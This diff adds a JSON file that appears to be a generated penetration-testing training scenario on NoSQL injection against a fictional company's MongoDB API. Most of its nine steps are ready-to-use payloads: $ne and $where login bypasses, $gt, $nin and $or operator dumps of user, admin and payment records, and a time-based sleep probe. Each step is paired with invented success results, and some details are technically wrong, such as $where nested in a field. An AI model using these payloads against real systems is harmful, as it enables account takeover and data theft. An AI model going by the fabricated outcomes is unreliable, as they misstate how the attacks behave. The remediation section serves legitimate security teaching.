@@ -1,0 +1,101 @@
+{
+  "title": "NoSQL Injection Against Modern API-Driven Application",
+  "description": "Assessment of RESTful API using MongoDB backend reveals NoSQL injection vulnerabilities. Demonstrates operator injection, authentication bypass, and mass data extraction from document database.",
+  "difficulty": "advanced",
+  "scenario": "StartupTech built modern microservices architecture using Node.js, Express, and MongoDB. Security assessment requested to validate API security before major product launch. Goal: identify NoSQL injection vulnerabilities, test authentication mechanisms, and assess data exposure risk.",
+  "steps": [
+    {
+      "step_number": 1,
+      "tool": "nosql_injection_testing",
+      "action": "Test login endpoint with NoSQL operator injection to bypass authentication",
+      "parameters": {"target_url": "https://api.startuptech.com/v1/auth/login", "payload": {"username": "admin", "password": {"$ne": ""}}},
+      "expected_result": "Authentication bypassed! Received JWT token with admin privileges - MongoDB $ne (not equal) operator returns true for any password not matching empty string",
+      "explanation": "NoSQL operator injection exploits MongoDB query operators when user input isn't properly validated"
+    },
+    {
+      "step_number": 2,
+      "tool": "nosql_injection_testing",
+      "action": "Extract all user accounts using $gt operator",
+      "parameters": {"target_url": "https://api.startuptech.com/v1/users", "payload": {"username": {"$gt": ""}, "password": {"$gt": ""}}},
+      "expected_result": "All 3,482 user accounts extracted including usernames, emails, roles - $gt (greater than) empty string matches all documents in collection",
+      "explanation": "Comparison operators like $gt, $gte, $lt can be abused to match all records"
+    },
+    {
+      "step_number": 3,
+      "tool": "nosql_injection_testing",
+      "action": "Use regex injection to search for admin accounts",
+      "parameters": {"target_url": "https://api.startuptech.com/v1/search", "payload": {"query": {"$regex": "admin.*", "$options": "i"}}},
+      "expected_result": "Found 8 admin accounts: admin, admin_backup, site_admin, db_admin, system_admin, support_admin, api_admin, super_admin - case-insensitive regex matched all variations",
+      "explanation": "$regex operator enables pattern matching - useful for discovering privileged accounts"
+    },
+    {
+      "step_number": 4,
+      "tool": "nosql_injection_testing",
+      "action": "Test $where JavaScript injection for code execution",
+      "parameters": {"target_url": "https://api.startuptech.com/v1/auth/login", "payload": {"username": "admin", "password": {"$where": "return true"}}},
+      "expected_result": "JavaScript injection successful - authenticated as admin using arbitrary code execution in $where clause, returned valid session token",
+      "explanation": "$where allows JavaScript execution in queries - extremely dangerous if not disabled"
+    },
+    {
+      "step_number": 5,
+      "tool": "nosql_injection_testing",
+      "action": "Use $or logical operator to extract privileged user accounts",
+      "parameters": {"target_url": "https://api.startuptech.com/v1/users/search", "payload": {"$or": [{"role": "admin"}, {"role": "superuser"}, {"role": "owner"}]}},
+      "expected_result": "Extracted 24 privileged accounts with full access permissions, API keys, and privilege levels including production database access credentials",
+      "explanation": "Logical operators like $or, $and, $nor can be chained to create complex queries"
+    },
+    {
+      "step_number": 6,
+      "tool": "nosql_injection_testing",
+      "action": "Extract sensitive user data using $nin (not in) operator",
+      "parameters": {"target_url": "https://api.startuptech.com/v1/query", "payload": {"user": {"$nin": ["guest", "anonymous", "test"]}}},
+      "expected_result": "Extracted 3,479 real user accounts excluding test users - includes bcrypt password hashes, personal emails, phone numbers, OAuth tokens, payment information",
+      "explanation": "$nin (not in) useful for filtering out unwanted records and focusing on production data"
+    },
+    {
+      "step_number": 7,
+      "tool": "sqlmap_post_injection",
+      "action": "Test POST endpoint with JSON injection using sqlmap",
+      "parameters": {"target_url": "https://api.startuptech.com/v1/orders", "post_data": "{\"user_id\":\"123\",\"status\":\"pending\"}", "content_type": "application/json"},
+      "expected_result": "JSON parameter 'user_id' vulnerable to injection - able to manipulate queries despite being JSON format, extracted order database structure",
+      "explanation": "Even JSON APIs can be vulnerable if parameters are directly concatenated into queries"
+    },
+    {
+      "step_number": 8,
+      "tool": "manual_sql_injection_testing",
+      "action": "Test for time-based NoSQL injection to confirm blind injection",
+      "parameters": {"target_url": "https://api.startuptech.com/v1/search", "payload": "?query[$where]=sleep(5000)||true"},
+      "expected_result": "Response delayed 5.234 seconds - time-based injection confirmed, enables blind data extraction character by character even without visible output",
+      "explanation": "Time-based techniques work in NoSQL too - useful when error messages are suppressed"
+    },
+    {
+      "step_number": 9,
+      "tool": "nosql_injection_testing",
+      "action": "Chain multiple operators to extract complete customer database",
+      "parameters": {"target_url": "https://api.startuptech.com/v1/customers", "payload": {"$and": [{"role": {"$ne": "test"}}, {"created_at": {"$gte": "2024-01-01"}}, {"subscription": {"$in": ["premium", "enterprise"]}}]}},
+      "expected_result": "Extracted 847 premium customer records created in 2024 including payment methods, subscription details, usage analytics, billing addresses - targeted query maximized valuable data",
+      "explanation": "Complex operator chains enable surgical data extraction targeting most valuable records"
+    }
+  ],
+  "outcome": "Comprehensive NoSQL injection vulnerability affecting authentication, user enumeration, and data access controls. Successfully bypassed login using $ne operator, extracted 3,482 user accounts, identified 24 privileged accounts with API keys, and obtained 847 premium customer records with payment data. Root cause: direct use of user input in MongoDB queries without sanitization. MongoDB query operators ($ne, $gt, $regex, $where, $or, $nin) interpreted as commands instead of data. Recommendations: CRITICAL - disable $where operator globally, implement input validation whitelisting allowed fields, use parameterized queries via ORM, never trust client-side data, implement query builder with sanitization, enable MongoDB audit logging, conduct security training on NoSQL injection, review all API endpoints for similar vulnerabilities, implement rate limiting and monitoring.",
+  "learning_objectives": [
+    "Understand NoSQL injection fundamentals and differences from SQL injection",
+    "Bypass authentication using MongoDB operator injection ($ne, $where)",
+    "Extract data using comparison operators ($gt, $gte, $lt, $lte)",
+    "Use regex injection for pattern-based searches",
+    "Chain logical operators ($or, $and, $nin) for complex queries",
+    "Identify time-based NoSQL injection for blind exploitation",
+    "Test JSON APIs for injection vulnerabilities",
+    "Provide NoSQL-specific remediation guidance"
+  ],
+  "metadata": {
+    "created_by": "neural_mesh_v5.2_generator",
+    "category": "pentesting",
+    "subcategory": "nosql_injection",
+    "tools_used": ["nosql_injection_testing", "sqlmap_post_injection", "manual_sql_injection_testing"],
+    "estimated_time": "60-75 minutes",
+    "authorization_required": true,
+    "severity": "critical",
+    "database_type": "mongodb"
+  }
+}
